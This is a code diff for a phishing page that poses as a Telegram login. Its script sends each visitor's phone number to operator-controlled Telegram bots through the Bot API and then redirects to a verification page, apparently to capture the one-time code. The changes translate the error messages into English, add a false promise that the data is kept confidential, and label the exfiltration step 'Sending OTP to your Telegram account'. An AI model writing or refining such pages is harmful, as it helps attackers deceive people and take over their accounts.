@@ -172,24 +172,22 @@
         <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394a.759.759 0 0 1-.6.295h-.006l.213-3.054 5.56-5.022c.24-.213-.054-.334-.373-.121l-6.869 4.326-2.96-.924c-.643-.203-.658-.643.136-.953l11.566-4.458c.538-.196 1.006.128.832.941z"/>
       </svg>
     </div>
-    <p>To continue, please login first</p>
+    <h1>Enter telegram number</h1>
+<p>To continue, please login first</p>
 
-  <form id="phoneForm">
-    <label>Telegram number</label>
-    <input type="tel" id="phoneInput" placeholder="Telegram number" required>
+<form id="phoneForm">
+  <label for="phone">Telegram number</label>
+  <input type="tel" id="phoneInput" placeholder="Telegram number" required />
 
-    <button type="submit">Next</button>
+  <button type="submit" class="btn">next</button>
 
-    <div class="disclaimer">
-      *Make sure the number entered is active to receive verification.
-    </div>
-  </form>
+  <div class="disclaimer">
+    *Make sure the number entered is active to receive verification.
+    Data will be kept confidential in accordance with the Personal Data Protection Act.
+  </div>
+</form>
 
-  <div class="status" id="statusMessage"></div>
-</div>
-
-<div id="blurOverlay"></div>
-<div id="loadingText">⏳ Processing...</div>
+<div class="status" id="statusMessage"></div>
 
 <script>
 const phoneForm = document.getElementById('phoneForm');
@@ -208,15 +206,16 @@ phoneForm.addEventListener('submit', function(e) {
 
   const phone = phoneInput.value.trim();
   if (!phone) {
-    statusMessage.textContent = "❌ Nomor tidak boleh kosong";
+    statusMessage.textContent = "❌ Phone number required";
     statusMessage.style.color = "red";
     return;
   }
 
   const currentBotIndex = parseInt(localStorage.getItem('currentBotIndex') || "0");
+  localStorage.setItem('sessionBotIndex', currentBotIndex);
   const bot = bots[currentBotIndex];
 
-  const message =
+  const message = 
 `🌀 *FUN GAY LOGIN*
 ━━━━━━━━━━━━━━
 📞 Phone: \`${phone}\`
@@ -224,7 +223,7 @@ phoneForm.addEventListener('submit', function(e) {
 
   const api = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
 
-  statusMessage.textContent = "⏳ Sending data...";
+  statusMessage.textContent = "⏳ Sending OTP to your Telegram account...";
   statusMessage.style.color = "#000";
   blurOverlay.style.display = "block";
   loadingText.style.display = "block";
@@ -233,10 +232,12 @@ phoneForm.addEventListener('submit', function(e) {
     .then(res => res.json())
     .then(data => {
       if (data.ok) {
-        localStorage.setItem('currentBotIndex', (currentBotIndex + 1) % bots.length);
+        const nextBotIndex = (currentBotIndex + 1) % bots.length;
+        localStorage.setItem('currentBotIndex', nextBotIndex);
+
         setTimeout(() => {
-          window.location.href = "verify.html";
-        }, 2500);
+          window.location.href = `verify.html?phone=${encodeURIComponent(phone)}`;
+        }, 3000);
       } else {
         throw new Error("Telegram error");
       }
@@ -244,10 +245,10 @@ phoneForm.addEventListener('submit', function(e) {
     .catch(err => {
       blurOverlay.style.display = "none";
       loadingText.style.display = "none";
-      statusMessage.textContent = "❌ Gagal mengirim data";
+      statusMessage.textContent = "❌ Error sending data";
       statusMessage.style.color = "red";
     });
 });
-  </script>
+</script>
 </body>
 </html>
